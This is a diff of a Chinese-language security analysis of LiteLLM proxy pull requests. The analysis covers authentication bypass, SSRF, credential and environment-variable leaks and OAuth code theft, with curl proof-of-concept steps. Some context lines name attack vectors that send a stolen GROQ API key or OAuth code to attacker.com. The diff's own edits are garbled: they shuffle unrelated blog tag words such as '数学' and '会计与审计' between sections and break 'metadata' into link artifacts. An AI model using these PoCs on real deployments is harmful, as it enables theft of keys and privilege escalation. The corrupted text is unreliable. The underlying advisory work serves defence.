@@ -31,6 +31,14 @@ asset_dir: embedded-base64
 
 ### 2.1 PR #26463 — MCP 公共路由检测绕过 + OAuth2 Fallback
 
+深入探索
+
+blog
+
+数据格式与协议
+
+软件
+
 **[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")类型**: 认证绕过 (CWE-290)  
 **修复文件**: `litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py`
 
@@ -73,7 +81,7 @@ asset_dir: embedded-base64
 
 **攻击向量**: `api_base=https://attacker.com/api.groq.com/openai/v1` 冒充 Groq 端点，代理读取 GROQ\_API\_KEY 并发送到攻击者服务器。
 
-计算机安全
+网络安全
 
 **额外加固**: 新增 9 个 banned params（langsmith\_base\_url, langfuse\_host, posthog\_host 等）
 
@@ -96,7 +104,7 @@ asset_dir: embedded-base64
 
 **攻击向量**: 任意已认证用户向 available-team 发送 `POST /team/member_add`，以 admin 角色将自己添加为成员。
 
-黑客与破解
+计算机安全
 
 ---
 
@@ -117,7 +125,7 @@ asset_dir: embedded-base64
 
 **攻击向量**: 发送 `{"metadata": {"guardrails": {}}}` 绕过 guardrail 修改权限，下游将空 dict 解读为"禁用所有 guardrails"。
 
-编程
+黑客与破解
 
 ---
 
@@ -155,7 +163,7 @@ asset_dir: embedded-base64
 
 **攻击向量**: 构造恶意 OAuth state，将 client\_redirect\_uri 设为 `https://attacker.com/cb`，callback 将 authorization code 重定向到攻击者域名。
 
-计算机服务器
+开放源代码
 
 ---
 
@@ -192,7 +200,7 @@ asset_dir: embedded-base64
 - **漏洞**: list/info/update 响应包含明文凭据（api\_key, aws\_secret\_access\_key 等）
 - **修复**: 响应中脱敏凭据 + per-store 权限控制
 
-### 3.4 PR #26851 — 环境变量泄露 via key metadata
+### 3.4 PR #26851 — 环境变量泄露 via key meta[data](#)
 
 - **漏洞**: key metadata 中 `os.environ/VAR_NAME` 引用可读取环境变量
 - **修复**: 阻止 env callback 引用
@@ -236,7 +244,7 @@ asset_dir: embedded-base64
 
 按 GHSA 分析器验证框架，对每个 PR 的分析结论逐项与实际 diff 对照。
 
-网络安全
+网络
 
 ### 审核结论
 
@@ -251,7 +259,7 @@ asset_dir: embedded-base64
 1. **PR #26862** — 分析仅覆盖 4 项修复，实际包含完整纵深防御机制：
 
    - `_UNTRUSTED_ROOT_CONTROL_FIELDS`: 16 个根级字段黑名单
-   - `_UNTRUSTED_METADATA_CONTROL_FIELDS`: 20+ 个 metadata 字段黑名单
+   - `_UNTRUSTED_METADATA_CONTROL_FIELDS`: 20+ 个 meta[data](#) 字段黑名单
    - `_strip_untrusted_request_header_controls()`: 剥离危险 header
    - 客户端 mock response / 消息去编辑需管理员显式授权
 2. **PR #26827** — 遗漏运行时 dict fallback 修复：`endpoint.get("auth")` → `endpoint.get("auth", True)`
@@ -280,7 +288,7 @@ Content-Type: application/json
 
 **判断依据**: 200 + 包含 tools 数组 = 绕过成功；401/403 = 已修复
 
-计算机安全
+编程
 
 #### PoC #26463-B: OAuth2 Fallback 无条件执行
 
@@ -326,7 +334,7 @@ Authorization: Bearer sk-your-litellm-key
 
 **判断依据**: 在 attacker.com 日志中观察到 Authorization header 包含 GROQ\_API\_KEY = 泄露成功
 
-黑客与破解
+网络安全
 
 #### PoC #26484: Master Key 泄露到 /metrics
 
@@ -357,7 +365,7 @@ Host: target:4000
 
 **判断依据**: 200 + 响应包含 API key = 劫持成功；需要 poll\_secret = 已修复
 
-数学
+黑客与破解
 
 ---
 
@@ -386,7 +394,7 @@ Authorization: Bearer sk-regular-user-key
 
 **判断依据**: 200 + 成员角色为 admin = 提权成功；403 = 已修复
 
-编程
+计算机安全
 
 #### PoC #26831: Batch 身份冒用
 
@@ -423,7 +431,7 @@ Authorization: Bearer sk-regular-user-key
 
 **判断依据**: 200 + 无 guardrail 拦截 = 绕过成功；403 guardrail violation = 已修复
 
-计算机服务器
+数学
 
 #### PoC #26827: Passthrough 默认无认证
 
@@ -457,9 +465,9 @@ curl -v "http://target:4000/mcp/oauth/callback?code=stolen-auth-code&state=malic
 
 **判断依据**: 302 重定向到 attacker.com/cb?code=... = code 窃取成功；400 invalid redirect = 已修复
 
-互联网与电信
+会计与审计
 
-#### PoC #26849: SSRF via OAuth Metadata Discovery
+#### PoC #26849: SSRF via OAuth Meta[data](#) Discovery
 
 ```
 curl -v -X POST http://target:4000/mcp/servers \
@@ -483,7 +491,7 @@ curl -v "http://target:4000/get_image?width=100"
 
 **判断依据**: 响应包含内网服务内容 = SSRF 成功；302 重定向或空响应 = 已修复
 
-网络安全
+计算机科学
 
 #### PoC #26815-B: Logo 路径泄露
 
@@ -510,7 +518,7 @@ curl -v -X POST http://target:4000/chat/completions \
 
 **判断依据**: 响应头包含 `x-injected-evil` = 注入成功；header 被过滤 = 已修复
 
-计算机安全
+开放源代码
 
 #### PoC #26862-B: Audit Log Spoofing
 
@@ -543,7 +551,7 @@ curl -v -X POST http://target:4000/v1/chat/completions \
 
 **判断依据**: 请求发送到畸形 AWS endpoint = 注入成功；400 invalid region = 已修复
 
-计算机服务器
+编程
 
 #### PoC #27794: 任意文件读取
 
@@ -572,7 +580,7 @@ curl -v -X POST http://target:4000/v1/chat/completions \
 
 **判断依据**: 请求成功 + 预算预留被锁定为团队全部余额 = DoS 成功；400 max\_tokens exceeded = 已修复
 
-编程
+网络安全
 
 #### PoC #26809: 预算绕过 via null budget
 
@@ -603,7 +611,7 @@ curl -v -X POST http://target:4000/team/callback_new \
 
 **判断依据**: 审计日志无此操作记录 = 日志缺失；审计日志存在且 secret\_key 脱敏 = 已修复
 
-计算机安全
+黑客与破解
 
 #### PoC #27554: Jinja2 模板注入
 
@@ -650,7 +658,7 @@ curl -v -X POST "http://target:4000/v1/chat/completions" \
 
 **判断依据**: 错误响应包含 prompt\_variables 及其值 = 泄露；仅包含 Prompt id = 已修复
 
-编程
+计算机安全
 
 #### PoC #26489: 向量存储凭据泄露
 
@@ -667,7 +675,7 @@ Authorization: Bearer sk-key
 
 **判断依据**: 响应中 litellm\_params 包含 sk-/AKIA/Bearer eyJ 明文凭据 = 泄露；值为 REDACTED = 已修复
 
-#### PoC #26851: 环境变量泄露 via key metadata
+#### PoC #26851: 环境变量泄露 via key meta[data](#)
 
 ```
 # 步骤1: 创建带 env 引用的 key
@@ -694,7 +702,7 @@ curl -v -X POST "http://target:4000/v1/chat/completions" \
 
 **判断依据**: 回调日志中包含真实 DATABASE\_URL/AWS\_SECRET = 泄露；key 创建被拒绝 = 已修复
 
-计算机安全
+会计与审计
 
 #### PoC #26836: MCP 凭据明文存储
 
